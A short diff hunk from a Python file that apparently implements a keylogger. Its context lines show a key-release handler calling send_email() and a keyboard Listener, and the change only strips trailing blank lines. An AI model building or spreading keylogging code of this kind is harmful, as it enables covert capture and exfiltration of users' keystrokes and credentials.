@@ -54,16 +54,3 @@ def on_release(key):
         send_email()
             
 with Listener(on_press=on_press, on_release=on_release) as listener: listener.join()
-    
-
-
-
-
-
-
-
-
-
-
-
-
